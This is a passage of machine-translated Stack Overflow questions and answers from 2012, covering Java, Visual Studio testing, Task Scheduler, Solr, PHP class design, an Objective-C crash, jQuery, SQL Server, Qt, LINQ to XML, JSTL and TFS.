> 时间：2012-05-25T15:51:03.320

由于这是一个教训，我不会直接给你解决方案，但我会给你一些提示：

1.  你只是在想`int`。换个`String`思路。:) 这也将处理用户为您提供大量数字的数字的情况。
2.  不过，您**将**需要验证您的输入；如果有人输入“12abc3”怎么办？
3.  `String.charAt(int)`会有帮助的。
4.  `Integer.parseInt(String)`也会有所帮助。

你也可以看看 using`long`而不是`int`; `long`上限为 9,223,372,036,854,775,807。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:22:10.857

```
//I assume that the input is a string which contains only digits
public static int parseString(String input)
{
    char[] charArray = input.toCharArray();
    int sum = 0;
    for (int index = 0; index < input.length; index++)
    {
        sum += Integer.parseInt(charArray[index] + "");
    }
    return sum;
} 
```

使用上面的函数，将输入传递给函数并根据需要使用输出。

# visual-studio - Visual Studio 负载测试：如何在每个测试用例调用中使用不同的数据（不使用数据源）？

> ID：10757472
> 
> 赞同：0
> 
> 时间：2012-05-25T15:45:44.107
> 
> 标签：visual-studio, load-testing

这样做有“最佳实践”吗？

我想出的最好的方法是实现一个 LoadTest 插件，它设置了一个 TestContext 属性（字符串）。然后，单元测试可以从该值通过算法生成一些东西。即便如此，多个虚拟用户和测试代理也会让事情变得复杂。我只能为共享插件实例的调用维护一个共享上下文。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-15T17:27:27.307

根据我的经验，最好的方法是让另一个 C# 库项目使用您从数据库中查询的数据创建 LoadTest 插件。这样，整个解决方案就会有一个库项目和一个性能测试项目。您在 Web 性能测试中引用库项目。在 Web 性能测试中，无论您需要不同的数据，您都可以使用负载测试插件来获取该数据。

# batch-file - 任务计划程序未使用 MSTest 命令执行批处理 (bat) 文件

> ID：10757473
> 
> 赞同：0
> 
> 时间：2012-05-25T15:45:44.633
> 
> 标签：batch-file, scheduled-tasks, mstest, scheduler, ordered-test

我有几个批处理文件，它们设置了日志文件路径并启动了 Visual Studio 2010 订单测试。当我从 Windows 资源管理器执行批处理文件时，它运行完美。问题是当我使用 Windows 任务计划程序运行批处理文件时，我的有序测试没有执行。

示例代码：

```
::: 
::: This batch kicks off the searchinlineset test set node.
:::

SetLogPath.vbs "\\spm08r2dw\ATPData\Webportal Test Results\"

%comspec% /c "call "%VS100COMNTOOLS%vsvars32.bat" & mstest /testcontainer:"%SmartUITestInstallPath%AUTs\Tests\DemoSuite\SearchInlineSet\SearchInlineSet.orderedtest"" /nologo /usestderr 
```

操作系统：Windows 7/2008 r2

任务计划程序配置映像：

1.  一般的：

    [![一般的](../Images/2ea06a45656d4119fd806ca695d7be4c.png)](https://i.stack.imgur.com/vsBLu.png)
    [（来源：[vsoh.com](http://a1.vsoh.com/1qkm.png)）]

2.  设置：

    [![设置](../Images/3a88af3170c1698ea11dbcfcd42e035d.png)](https://i.stack.imgur.com/ukRqK.png)
    [（来源：[vsoh.com](http://a0.vsoh.com/2dus.png)）]

3.  条件：

    [![条件](../Images/99db3b40681ab6d5a8be2deadbe6c31d.png)](https://i.stack.imgur.com/FpG0J.png)
    [（来源：[vsoh.com](http://a1.vsoh.com/3nnt.png)）]

4.  编辑动作：

    [![编辑动作](../Images/5b7dae2ce748c7d5760cb980752ff2ab.png)](https://i.stack.imgur.com/HLGUa.png)
    [（来源：[vsoh.com](http://a1.vsoh.com/4xts.png)）]

5.  编辑触发器：

    [![编辑触发器](../Images/f400aa314c94c0ec9f92dd041ed774c9.png)](https://i.stack.imgur.com/kEkPD.png)
    [（来源：[vsoh.com](http://a1.vsoh.com/5zkl.png)）]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T19:48:32.567

# 解决方法：

导航到计划任务的常规**选项****卡**并选择**“仅在用户登录时运行”**。现在调度程序将执行 .ordertest 计划任务。这当然需要用户登录，但至少**.bat**将按计划执行。

 ******* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T21:07:50.037

导航到计划任务的常规选项卡并选择“以最高权限运行”。将用户帐户更改为 SYSTEM 并使用允许在代码中传递身份验证参数的命令，例如 PowerShell cmdlet Start-BitsTransfer。

此外，根据需要在编辑操作选项卡下填写正确的开始路径或参数。我使用一个 .bat 文件来启动它，所以我填写了 start in 框。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T21:41:48.953

将文件夹和文件的权限显式设置为完全控制，并将 start in folder 参数作为批处理文件为我解决问题的目录的路径。

查看此链接 [http://social.technet.microsoft.com/Forums/en-US/winservermanager/thread/d47d116e-10b9-44f0-9a30-7406c86c2fbe/](http://social.technet.microsoft.com/Forums/en-US/winservermanager/thread/d47d116e-10b9-44f0-9a30-7406c86c2fbe/)******

# android - Android - 带有哈希标签的 phonegap loadUrl

> ID：10757477
> 
> 赞同：0
> 
> 时间：2012-05-25T15:45:56.587
> 
> 标签：android, cordova

我最近将一个项目从一个非常旧的 phonegap 版本升级到了 cordova 1.7.0，它正在尝试使用 loadUrl 将一个网页加载到 webView 中，其 url 如下所示：

[http://www.example.com/blog-page-123#showComment=45](http://www.example.com/blog-page-123#showComment=45)

但它会引发 Uncaught ReferenceError: showComment is not defined at [http://www.example.com/blog-page-123#showComment=45:1](http://www.example.com/blog-page-123#showComment=45:1)

这是怎么回事？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:36:35.607

您可能会遇到问题：

[https://code.google.com/p/android/issues/detail?id=17535](https://code.google.com/p/android/issues/detail?id=17535)

[https://code.google.com/p/android/issues/detail?id=17327](https://code.google.com/p/android/issues/detail?id=17327)

去明星吧。

# solr - Solr 分面分页

> ID：10757479
> 
> 赞同：1
> 
> 时间：2012-05-25T15:45:59.530
> 
> 标签：solr, count, pagination, facet

如何在 Solr 中对分面计数进行分页？，我知道我有 facet.offset 来跳过记录，但是我怎么知道有多少条记录有分面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-26T09:36:26.003

您需要应用 Solr Patch [SOLR-2242](https://issues.apache.org/jira/browse/SOLR-2242)来获取 Facet 不同计数。
总计数有助于分页。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-25T10:30:15.533

在 Solr 5.3 及以上版本中，使用 facet 获取文档总数，

对于那个简单的用途，

```
facet=on 
```

例如

```
http://<solr-url>/select?facet=on&indent=on&q=*:*&rows=0&wt=json 
```

然后你会得到一个 facets 对象作为响应，它看起来像，

```
{
  "responseHeader":{
    "zkConnected":true,
    "status":0,
    "QTime":3,
    "params":{
      "q":"*:*",
      "indent":"on",
      "rows":"0",
      "facet":"on",
      "wt":"json"}},
  "response":{"numFound":8,"start":0,"maxScore":1.0,"docs":[]
  },
  "facet_counts":{
    "facet_queries":{},
    "facet_fields":{},
    "facet_ranges":{},
    "facet_intervals":{},
    "facet_heatmaps":{}}
} 
```

你`numFound`从`response`，这是该 solr 核心中的记录总数

**其他方式**

如果您有任何方面查询，请使用，

```
facet=on&json.facet={} 
```

例如

```
http://<solr-url>/select?facet=on&indent=on&json.facet={}&q=*:*&rows=0&wt=json 
```

然后你会得到一个 facets 对象作为响应，它看起来像，

```
{
  "responseHeader":{
    "zkConnected":true,
    "status":0,
    "QTime":3,
    "params":{
      "json.facet":"{}",
      "q":"*:*",
      "indent":"on",
      "rows":"0",
      "facet":"on",
      "wt":"json"}},
  "response":{"numFound":80,"start":0,"maxScore":1.0,"docs":[]
  },
  "facet_counts":{
    "facet_queries":{},
    "facet_fields":{},
    "facet_ranges":{},
    "facet_intervals":{},
    "facet_heatmaps":{}},
  "facets":{
    "count":80}} 
```

from `facets`object 你得到`count`的，这是最大记录数

# php - 困惑：我班级的数据成员中的数组中的无尽数组。糟糕的班级设计？

> ID：10757480
> 
> 赞同：0
> 
> 时间：2012-05-25T15:46:04.747
> 
> 标签：php, javascript, oop

假设有三个类：

**发起人**{ `id`[int], `name`[string], `sponsoredProjects`[array of **Project** objects]}

**项目**{ `id`[int], `name`[string], `desc`[string], [**赞助商**`sponsors`对象数组]}

 ****School** { `id`[int], `name`[string], [**项目**`projectsDone`对象数组}

 **我被困在**Sponsor**`sponsoredProjects`和**Project**`sponsors`之间。

从理论上讲，如果我创建了一个**项目**，那么我也需要为其创建**赞助商**。如果我创建**赞助商**，那么我也需要为它创建**项目**。

因此，这将导致无穷无尽的**Project** with **Sponsor** in their in their with **Project** in them with **Sponsors** and etc. 我是对的吗？同样的问题也应该适用于**学校**，因为他们有一系列**项目**，其中有一系列**赞助商**，有一系列**项目**等等。

***如果是这样，那么我应该如何避免这个缺陷？***

我的目标是临时从返回的多个 SQL 结果中创建所有这些对象，然后我将其发送到 JavaScript 页面。

```
final class Sponsor{
    private $_id;
    private $_name;
    private $_projects;

    public function __construct($id, $name, Project $projects){
        $this->setSponsor($id, $name, $projects);
    }

    public function getId(){
        return $this->_id;
    }

    public function getName(){
        return $this->_name;
    }

    public function getProjects(){
        return $this->_projects;
    }

    private function setId($id){
        $this->_id = $id;
    }

    private function setName($name){
        $this->_name = $name;
    }

    private function setProject(Project $projects){
        $this->_projects = array();
        foreach($projects as $val){
            array_push($this->_projects, $val);
        }
    }

    private function setSponsor($id, $name, Project $projects){
        $this->setId($id);
        $this->setName($name);
        $this->setProjects($projects);
    }
}

final class Project{
    private $_id;
    private $_name;
    private $_desc;
    private $_sponsors;

    public function __construct($id, $name, $desc, Sponsor $sponsors){
        $this->setProject($id, $name, $desc, $sponsors);
    }

    private function setId($id){
        $this->_id = $id;
    }

    private function setName($name){
        $this->_name = $name;
    }

    private function setDesc($desc){
        $this->_desc = $desc;
    }

    private function setSponsors(Sponsor $sponsors){
        $this->_sponsors = array();
        foreach($sponsors as $obj){
            $id = $obj->getId();
            $name = $obj->getName();
            $projects = $obj->getProjects();
            array_push($this->_sponsors, new Sponsor($id, $name, Project $this));
        }
    }

    private function setProject($id, $name, $desc, Sponsor $sponsors){
        $this->setId($id);
        $this->setName($name);
        $this->setDesc($desc);
        $this->setSponsors($sponsors);
    }
}

final class School{

    private $_id;
    private $_name; 
    private $_projectsDone;

    public function __construct($id, $name, Project $projects){
        $this->setSchool($id, $name, $projects);
    }

    private function setId($id){
        $this->_id = $id;
    }

    private function setName($name){
        $this->_name = $name;
    }

    private function setProjectsDone($projects){
        $this->_projectsDone = array();
        foreach($projectsDone as $val){
            $this->{_projectsDone}[] = $val;
        }
    }

    public function setSchool($id, $name, $projectsDone){
        $this->setId($id);
        $this->setName($name);
        $this->setProjectsDone($projectsDone);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:44:00.157

你有一个[循环引用](http://en.wikipedia.org/wiki/Circular_reference)问题。与其每个对象都保存与其相关的对象数组，不如尝试保留其 id 数组并在需要时查找相关实体。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:45:53.950

让对象在彼此之间来回保持引用并没有错。这很常见，它是集合上的正常（自反）关系。例如，javascript 中的 DOM……一个 Element 节点知道它的子节点，而它的子节点知道它们的父节点。

显然，在构造和初始化它们时需要小心，因为有一点鸡和蛋的问题，但检查归结为

```
if relation to object not established
    establish() 
```

您提到您将此信息存储在数据库中。你甚至可以避免检查。例如，您可能有以下表格：

```
Sponsor
Project
School
SponsoredProjects - many to many relation
SchoolProjectsDone - many to many relation 
```

构造 Sponsor、Project 和 School 对象，然后遍历 SponsoredProjects 和 SchoolProjectsDone 表中的关系，关联对象。****

# objective-c - drawRect 中的崩溃 - 是什么原因导致的？

> ID：10757481
> 
> 赞同：10
> 
> 时间：2012-05-25T15:46:15.677
> 
> 标签：objective-c, macos

我的一些用户遇到了这个崩溃。

据我所知，它以某种方式与`-drawRect:`我的 subclassed 的方法有关`NSTextView`，但我看不出可能导致它的原因，并且压力测试未能消除该错误。

drawRect 的代码

```
- (NSRange)visibleRangeOfTextView:(NSRect) rect {
    NSLayoutManager *layoutManager = [self
                                      layoutManager];
    NSTextContainer *textContainer = [self
                                      textContainer];
    NSRange glyphRange, characterRange;
    // first transform to text container coordinates
    NSPoint containerOrigin = [self textContainerOrigin];
    rect.origin.x -= containerOrigin.x;
    rect.origin.y -= containerOrigin.y;

    // next, compute glyph range
    glyphRange = [layoutManager glyphRangeForBoundingRect:rect inTextContainer:textContainer];

    // finally, compute character range
    characterRange = [layoutManager characterRangeForGlyphRange:glyphRange actualGlyphRange:NULL];
    return characterRange;
}

- (NSRect)rectForCharacterRange:(NSRange)charRange
{
    NSRect rect = [self
                   firstRectForCharacterRange:charRange];
    rect.origin = [[self window]
                   convertScreenToBase:rect.origin];
    rect = [self convertRect:rect fromView:nil];
    if (!rect.size.width) rect.size.width = 6.0;
    return rect;
}

- (void)drawRect:(NSRect)dirtyRect
{
    [super drawRect:dirtyRect];
    NSLog(@"Marking it");
    NSMutableArray *arr = [[NSMutableArray alloc] init];
    NSRange visible = [self visibleRangeOfTextView:dirtyRect];
    NSRange last = NSMakeRange(visible.location, 0);    while (true) {
        NSRange error = [appController rangeOfMisspelledWordInString:self.string onlyInRange:visible startingAt:last.location + last.length];
        last = error;
        if (error.location == NSNotFound) {
            break;
        }
        [arr addObject:[NSValue valueWithRange:error]];
    }

    NSLog(@"Spellchecked");

    [[NSColor redColor] setStroke];
    CGFloat dash[] = {2.0f, 2.0f} ;
    // Make the text ranges and mark them
    for (NSValue *val in arr) {
        NSRange range = [val rangeValue]; 
        NSRect rectInTextView = [self rectForCharacterRange:range];
        NSRect toDraw = rectInTextView;
        NSBezierPath*    aPath = [NSBezierPath bezierPath];
        [aPath setLineDash:dash count:2 phase:0];

        NSPoint lineStart = toDraw.origin;
        lineStart.y += toDraw.size.height;
        NSPoint lineEnd = lineStart;
        lineEnd.x += toDraw.size.width;

        [aPath moveToPoint:lineStart];
        [aPath lineToPoint:lineEnd];
        [aPath stroke];        
    };
    NSLog(@"Done");    
} 
```

堆栈跟踪：

```
Crashed Thread:  0  Dispatch queue: com.apple.main-thread

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x0000000000000000, 0x0000000000000000

Application Specific Information:
objc[5751]: garbage collection is ON
*** Terminating app due to uncaught exception 'NSRangeException', reason: '*** -[NSConcreteTextStorage attribute:atIndex:longestEffectiveRange:inRange:]: Range or index out of bounds'
*** First throw call stack:
(
    0   CoreFoundation                      0x00007fff91387fc6 __exceptionPreprocess + 198
    1   libobjc.A.dylib                     0x00007fff8d4d7d5e objc_exception_throw + 43
    2   CoreFoundation                      0x00007fff91387dfa +[NSException raise:format:arguments:] + 106
    3   CoreFoundation                      0x00007fff91387d84 +[NSException raise:format:] + 116
    4   AppKit                              0x00000001005d842c -[NSConcreteTextStorage attribute:atIndex:longestEffectiveRange:inRange:] + 131
    5   AppKit                              0x00000001006288ec -[NSLayoutManager(NSPrivate) _drawBackgroundForGlyphRange:atPoint:parameters:] + 910
    6   AppKit                              0x00000001006277a2 -[NSTextView drawRect:] + 1913
    7   Skrivest√∏tte                       0x000000010000b56c Skrivest√∏tte + 46444
    8   AppKit                              0x0000000100626e66 -[NSTextView _drawRect:clip:] + 2545
    9   AppKit                              0x00000001004a985d -[NSView _recursiveDisplayRectIfNeededIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:topView:] + 3020
    10  AppKit                              0x00000001004aa34e -[NSView _recursiveDisplayRectIfNeededIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:topView:] + 5821
    11  AppKit                              0x00000001004aa34e -[NSView _recursiveDisplayRectIfNeededIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:topView:] + 5821
    12  AppKit                              0x00000001004a39af -[NSView _displayRectIgnoringOpacity:isVisibleRect:rectIsVisibleRectForView:] + 4755
    13  AppKit                              0x000000010049c395 -[NSView displayIfNeeded] + 1528
    14  AppKit                              0x00000001004a1592 -[NSClipView _immediateScrollToPoint:] + 6533
    15  AppKit                              0x000000010049fb75 -[NSClipView scrollToPoint:] + 239
    16  AppKit                              0x000000010058f637 -[NSScrollView scrollClipView:toPoint:] + 266
    17  AppKit                              0x000000010058f3da -[NSClipView _scrollTo:animateScroll:flashScrollerKnobs:] + 1497
    18  AppKit                              0x00000001005923b7 -[NSClipView _scrollTo:animate:] + 27
    19  AppKit                              0x0000000100bcd5a2 __-[NSScrollView _snapRubberBand]_block_invoke_2 + 1536
    20  AppKit                              0x0000000100b3fc4e ____NSPeriodicInvokerScheduled_block_invoke_2 + 53
    21  libdispatch.dylib                   0x00007fff907b98ba _dispatch_call_block_and_release + 18
    22  libdispatch.dylib                   0x00007fff907bbc07 _dispatch_after_timer_callback + 16
    23  libdispatch.dylib                   0x00007fff907be2b6 _dispatch_source_invoke + 635
    24  libdispatch.dylib                   0x00007fff907baf77 _dispatch_queue_invoke + 71
    25  libdispatch.dylib                   0x00007fff907bb6f7 _dispatch_main_queue_callback_4CF + 257
    26  CoreFoundation                      0x00007fff9131d06c __CFRunLoopRun + 1724
    27  CoreFoundation                      0x00007fff9131c676 CFRunLoopRunSpecific + 230
    28  HIToolbox                           0x00007fff93ab831f RunCurrentEventLoopInMode + 277
    29  HIToolbox                           0x00007fff93abf5c9 ReceiveNextEventCommon + 355
    30  HIToolbox                           0x00007fff93abf456 BlockUntilNextEventMatchingListInMode + 62
    31  AppKit                              0x000000010045ff5d _DPSNextEvent + 659
    32  AppKit                              0x000000010045f861 -[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 135
    33  AppKit                              0x000000010045c19d -[NSApplication run] + 470
    34  AppKit                              0x00000001006dab88 NSApplicationMain + 867
    35  Skrivest√∏tte                       0x0000000100001020 Skrivest√∏tte + 4128
    36  ???                                 0x0000000000000002 0x0 + 2
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T08:25:41.330

*** 由于未捕获的异常“NSRangeException”而终止应用程序，原因：“***

> [NSConcreteTextStorage 属性：atIndex:longestEffectiveRange:inRange:]：范围或索引超出范围'

正如 O' y 所说，这显然是一个 NSRange 例外

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T02:01:01.547

我认为您需要添加断言功能来检查“范围”

```
NSRange range = [val rangeValue]; 
```

确保范围不会`NSNotFound`。

# jquery - 使用开始标签与自结束标签创建一个空元素

> ID：10757482
> 
> 赞同：13
> 
> 时间：2012-05-25T15:46:19.907
> 
> 标签：jquery

在jQuery中，这之间有什么区别：

```
$('<div>').appendTo('body'); 
```

和这个：

```
$('<div />').appendTo('body'); 
```

我一直认为它是“自我关闭”的方式，但我遇到了在某些生产代码中使用的第一种方式而没有错误。这是否有可能导致问题发生，或者这是一种可以接受的做法？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-25T15:55:21.850

[文档](http://api.jquery.com/jQuery/#jQuery2)说：

> 当参数有单个标签时，例如 $('<img />') 或 $('<a></a>')，jQuery 使用原生 JavaScript createElement() 函数创建元素。

它还说：

> 不能包含元素的标签可以快速关闭也可以不快速关闭

因此，该表格`$('<div>')`显然也有效，但没有记录。从文档中可以清楚地看出，其意图是需要关闭标签的标签应该具有该关闭标签，或者是自关闭的。

我会坚持使用记录在案的版本，因为它不太可能成为未来版本中重大更改的受害者。

*<rant>*
jQuery 库有将尽可能多的内容放在单个函数调用中的习惯（请参阅最近`on`添加的示例），因此当您使用非自闭标签...
*</rant>*

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-25T15:56:27.467

不，这`$("<div>")`和这`$("<div />")`都不会引起问题。

证明是这样的，如果我们去[jQuery 源代码](http://code.jquery.com/jquery.js)，我们可以看到，在选择器具有单标签语法的情况下，`<...>`它会使用以下正则表达式解析选择器：

```
rsingleTag = /^<(\w+)\s*\/?>(?:<\/\1>)?$/ 
```

其中仅使用符号部分，`createElement`并且结束斜杠可以是可选的。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-25T15:47:48.673

只要后面没有任何内容，该语法就不会引起问题。

```
$("<div>") // Ok!
$("<div>foobar") // Not Ok!
$("<div><p>") // Not Ok! 
```

有关参考，请参阅[http://api.jquery.com/jQuery/#jQuery2](http://api.jquery.com/jQuery/#jQuery2)

# sql - 如何确定数据库中的一组特定表是否为空

> ID：10757483
> 
> 赞同：0
> 
> 时间：2012-05-25T15:46:20.763
> 
> 标签：sql, sql-server-2008

我有一个数据库 A，其中包含一个表（CoreTables），该表存储了数据库 B 中的活动表列表，组织的用户正在向这些表发送数据。

我希望能够有一个基于集合的查询，它可以输出仅包含 CoreTables 中填充了数据的那些表的列表。

动态地，我通常会做类似的事情：

对于 CoreTables 中的每一行 获取表名 如果表为空 什么都不做 Else 打印表名

有没有办法在没有游标或其他动态方法的情况下做到这一点？感谢您的任何帮助...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:14:20.777

可能最有效的选择是：

```
SELECT c.name 
  FROM dbo.CoreTables AS c
  WHERE EXISTS 
  (
    SELECT 1 
    FROM sys.partitions 
    WHERE index_id IN (0,1) 
    AND rows > 0
    AND [object_id] = OBJECT_ID(c.name)
  ); 
```

请注意，由于进行中的事务，sys.sysindexes、sys.partitions 和 sys.dm_db_partition_stats 中的计数不能保证完全同步。

虽然您可以只在数据库的上下文中运行此查询，但您可以对不同的数据库执行此操作，如下所示（再次假设 CoreTables 的名称中不包含架构）：

```
SELECT c.name
FROM DatabaseA.CoreTables AS c
WHERE EXISTS
(
  SELECT 1
    FROM DatabaseB.sys.partitions AS p
    INNER JOIN DatabaseB.sys.tables AS t
    ON p.[object_id] = t.object_id
    WHERE t.name = c.name
    AND p.rows > 0
); 
```

如果您需要对都包含相同架构的多个数据库执行此操作（或者至少是您在中央 CoreTables 表中聚合捕获的重叠架构），您可能需要构建一个视图，例如：

```
CREATE VIEW dbo.CoreTableCounts
AS
    SELECT db = 'DatabaseB', t.name, MAX(p.rows)
      FROM DatabaseB.sys.partitions AS p
      INNER JOIN DatabaseB.sys.tables AS t
      ON p.[object_id] = t.[object_id]
      INNER JOIN DatabaseA.dbo.CoreTables AS ct
      ON t.name = ct.name
      WHERE p.index_id IN (0,1)
      GROUP BY t.name
    UNION ALL
    SELECT db = 'DatabaseC', t.name, rows = MAX(p.rows)
      FROM DatabaseC.sys.partitions AS p
      INNER JOIN DatabaseC.sys.tables AS t
      ON p.[object_id] = t.[object_id]
      INNER JOIN DatabaseA.dbo.CoreTables AS ct
      ON t.name = ct.name
      WHERE p.index_id IN (0,1)
      GROUP BY t.name
    -- ...
GO 
```

现在您的查询不会那么高效，但不需要将数据库名称硬编码为对象前缀，而是可以：

```
SELECT name 
FROM dbo.CoreTableCounts 
WHERE db = 'DatabaseB'
AND rows > 0; 
```

如果执行起来很痛苦，您可以为每个数据库创建一个视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:58:17.653

这是您可以做到的一种方式，它依赖于系统表，因此请注意，它可能并不总是适用于未来的 SQL 版本。牢记这一强烈警告。

```
select distinct OBJECT_NAME(id) as tabName,rowcnt
from sys.sysindexes si
join sys.objects so on si.id=si.id 
where indid=1 and so.type='U' 
```

您将在 where 子句中添加您感兴趣的表和 rowcnt <1

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:49:59.007

像这样的东西？

```
//
            foreach (System.Data.DataTable dt in yourDataSet.Tables)
            {
                if (dt.Rows.Count != 0) { PrintYourTableName(dt.TableName); }
            }
            // 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:12:22.337

在 SQL Server 中，您可以执行以下操作：

```
SELECT o.name, st.row_count
FROM sys.dm_db_partition_stats st join
     sys.objects o
     on st.object_id = o.object_id
WHERE index_id < 2 and st.row_count > 0 
```

顺便说一句，这特别不使用 OBJECT_ID() 或 OBJECT_NAME() 因为它们是在当前数据库中评估的。上面的代码继续适用于另一个数据库，使用 3 部分命名。此版本还考虑了多个分区：

```
SELECT o.name, sum(st.row_count)
FROM <dbname>.sys.dm_db_partition_stats st join
     <dbname>.sys.objects o
     on st.object_id = o.object_id
WHERE index_id < 2
group by o.name
having sum(st.row_count) > 0 
```

# string - 使用 QString 跳过注释行

> ID：10757490
> 
> 赞同：1
> 
> 时间：2012-05-25T15:46:36.380
> 
> 标签：string, qt, parsing, stream, comments

我想跳过使用 QStrings 解析的文本文件中的注释行。

例如，如何跳过任何以字符“#”开头的行？

这是我目前拥有的：

```
 QTextStream in(&inputFile);
     QList< QStringList > lists;
     QString inputLines;

     do {
          inputLines = in.readLine();
          lists << inputLines.split("\t");

        } while (!inputLines.isNull());
          .
          .
          . 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:31:44.410

只需[`QString::startsWith(QString)`](http://qt-project.org/doc/qt-4.8/qstring.html#startsWith)在处理它们之前过滤行，如下例所示：

```
QStringList lines = ...;
foreach(QString line, lines)
{
    line = line.trimmed(); // if you want to ignore whitespaces at both ends
    if(!line.startsWith("#"))
        processLine(line);
} 
```

# c# - 使用 IEnumerable.Except() 比较两个 XML 文件

> ID：10757492
> 
> 赞同：2
> 
> 时间：2012-05-25T15:46:47.813
> 
> 标签：c#, xml, compare, ienumerable, linq-to-xml

使用以下代码：

```
 XDocument aDoc = XDocument.Load(fileA);
    XDocument bDoc = XDocument.Load(fileB);

    var commonfromA = aDoc.Descendants("Project").Except(bDoc.Descendants("Project")); 
```

我比较以下 XML：

文档.xml

```
<Employees>
      <Project ID="1" Name="Project1"/>
      <Project ID="2" Name="Project2"/>
</Employees> 
```

bDoc.xml

```
<Employees>
  <Project ID="1" Name="Project1"/>
  <Project ID="3" Name="Project3"/>
</Employees> 
```

当我执行我获得的代码时

```
<Project ID="1" Name="Project1"/>
<Project ID="2" Name="Project2"/> 
```

而不是

```
<Project ID="2" Name="Project2"/> **Which is the elements that are in A but not in B** 
```

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:50:56.270

是的，这是因为 aDoc 中的所有元素实际上都不在 bDoc*中*。如果您向其中的每一个元素询问其父元素，它们将报告不同的结果。

如果您对获得 ID 感到满意，这很容易：

```
var idsJustInA = aDoc.Descendants("Project")
                     .Select(x => (int) x.Attribute("ID"))
                     .Except(bDoc.Descendants("Project"))
                                 .Select(x => (int) x.Attribute("ID"))); 
```

如果你想要元素本身，你可以*传递*一个`IEqualityComparer<XElement>`通过 ID 比较元素，或者你可以使用类似[`ExceptBy`](http://code.google.com/p/morelinq/source/browse/MoreLinq/ExceptBy.cs)来自[MoreLINQ](http://morelinq.googlecode.com)的东西：

```
var justInA = aDoc.Descendants("Project")
                  .ExceptBy(bDoc.Descendants("Project"),
                            x => (int) x.Attribute("ID")); 
```

# java - jstl输出不起作用

> ID：10757498
> 
> 赞同：2
> 
> 时间：2012-05-25T15:47:06.243
> 
> 标签：java, jsp, tomcat, servlets, jstl

我正在制作一个与 tomcat 7 (7.0.27) 兼容的应用程序（为 tomcat 5.5 开发）。我在使用 jstl 时遇到问题，只是在我指定时不输出标签：

```
<web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
version="3.0"> 
```

在我的 WEB-INF/web.xml 文件中（之前使用的是 2.4 版本）。

一个示例 .jsp 文件：

```
%@page
   language="java"
   pageEncoding="utf-8"
   contentType="text/html;charset=utf-8"
   buffer="none"
%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ taglib uri="uri:path-to-layout/layout" prefix="layout" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/fmt" prefix="fmt" %>
<fmt:bundle basename="com.path.to.resources.Labels"> 
```

...

```
<td><input
name="j_username"
id="j_username" 
maxlength="30" 
accesskey="2" 
type="text"
style="width: 150px;"
value="<c:out value="${pageContext.request.remoteUser}" default="" />" /></td> 
```

我收到的不是预期的输出，而是：

```
${pageContext.request.remoteUser} 
```

作为文本字段中的值。

我使用 JSTL 1.2.1、Tomcat 7.0.27、JSP 2.2。代码编译，当我将 web.xml 中的 web-app 版本从 3.0 更改为 2.4 时，它可以在不直接输出这些值的情况下工作（尽管还有其他问题迫使我使用 3.0 版本）。有什么想法可能是导致此问题的原因吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T02:57:01.623

您提到您使用的是 JSTL 1.2.1，我认为它是从 Glassfish 服务器劫持的以下内容：

*   `javax.servlet.jsp.jstl-1.2.1.jar`
*   `javax.servlet.jsp.jstl-api-1.2.1.jar`

但是，根据评论，您似乎仍然在以下 117 个文件中拥有旧的 JSTL 1.0/1.1 库`/WEB-INF/lib`：

*   `jstl.jar`
*   `standard.jar`

那只会有冲突。**删除**它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:54:29.150

您需要对 使用单引号`c:out`，否则您将结束标记的`value`属性。`input`改为这样做：

```
<td><input name="j_username" id="j_username" maxlength="30" accesskey="2"
     type="text" style="width: 150px;" 
     value="<c:out value='${pageContext.request.remoteUser}' default='' />" /></td> 
```

# visual-studio-2010 - 折叠并取消选择 TFS 挂起更改层次结构

> ID：10757500
> 
> 赞同：2
> 
> 时间：2012-05-25T15:47:11.667
> 
> 标签：visual-studio-2010, view, tfs, hierarchical

TFS 挂起更改视图 (VS2010) 使用起来很烦人，尤其是层次视图总是展开的事实。此外，当我签入一些文件时，挂起的更改视图会刷新，所有项目都会展开并被选中。考虑到工作区中有多种解决方案（在功能和逻辑上是不相交的），并且在任何时候我都可以在多个轨道上工作，自动刷新、展开和选择会迫使我遍历每个节点并折叠和取消选择它。

